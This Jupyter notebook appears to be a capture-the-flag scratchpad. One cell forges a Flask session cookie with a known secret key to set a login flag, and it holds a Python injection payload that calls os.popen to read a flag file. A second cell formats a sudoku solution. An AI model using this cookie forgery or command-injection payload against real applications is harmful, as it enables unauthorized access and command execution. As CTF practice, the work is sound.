{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[b'eyJpc2xvZ2luIjoidHJ1ZSJ9.ZIRahA.Z08ePcbJTVc-UhucZSVRaUYcdok\\r\\n']\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import subprocess\n",
    "# 既可以判断执行是否成功，还可以获取执行结果\n",
    "def subprocess_popen(statement):\n",
    "    p = subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)  # 执行shell语句并定义输出格式\n",
    "    while p.poll() is None:  # 判断进程是否结束（Popen.poll()用于检查子进程（命令）是否已经执行结束，没结束返回None，结束后返回状态码）\n",
    "        if p.wait() != 0:  # 判断是否执行成功（Popen.wait()等待子进程结束，并返回状态码；如果设置并且在timeout指定的秒数之后进程还没有结束，将会抛出一个TimeoutExpired异常。）\n",
    "            print(\"命令执行失败，请检查设备连接状态\")\n",
    "            return False\n",
    "        else:\n",
    "            return p.stdout.readlines()  # 获取原始执行结果\n",
    "\n",
    "fscm_path = \"flask_session_cookie_manager3.py\"\n",
    "cookie = \"eyJpc2xvZ2luIjpmYWxzZX0.ZIQNKg.HB2kh2yZ3aRJYo95JXleuhT1xQQ\"\n",
    "key = 'o2takuXX_donot_like_ntr'\n",
    "# key = 'tanji_is_A_boy_Yooooooooooooooooooooo!'\n",
    "# value = \"{'number':'326410031505','username':'admin'}\"\n",
    "value = \"{'islogin':'true'}\"\n",
    "\n",
    "cmd_decode = 'python flask_session_cookie_manager3.py decode -c '+ cookie\n",
    "cmd_encode = 'python flask_session_cookie_manager3.py encode -s \\\"'+ key + '\\\" -t \\\"' + value + '\\\"'\n",
    "# print(cmd_encode)\n",
    "\n",
    "# 加密\n",
    "print(subprocess_popen(cmd_encode))\n",
    "# 解密\n",
    "# print(subprocess_popen(cmd_decode))\n",
    "\n",
    "\n",
    "payload = '__import__(\"os\").popen(\"cat /TRUE*\").read()'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "164759328\n",
      "952368714\n",
      "378124596\n",
      "981475236\n",
      "537126489\n",
      "642839751\n",
      "647813592\n",
      "893245671\n",
      "215967483"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'070091420000500000908020010004750692200600050069080070003005200001000705400278030'"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "for _,i in enumerate(\"164759328952368714378124596981475236537126489642839751647813592893245671215967483\"):\n",
    "    if _%9==0:\n",
    "        print()\n",
    "    print(i,end=\"\")\n",
    "\n",
    "\"\"\"070091420\n",
    "000500000\n",
    "908020010\n",
    "004750692\n",
    "200600050\n",
    "069080070\n",
    "003005200\n",
    "001000705\n",
    "400278030\n",
    "\n",
    "\"\"\".replace(\"\\n\",\"\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "py11",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.0"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
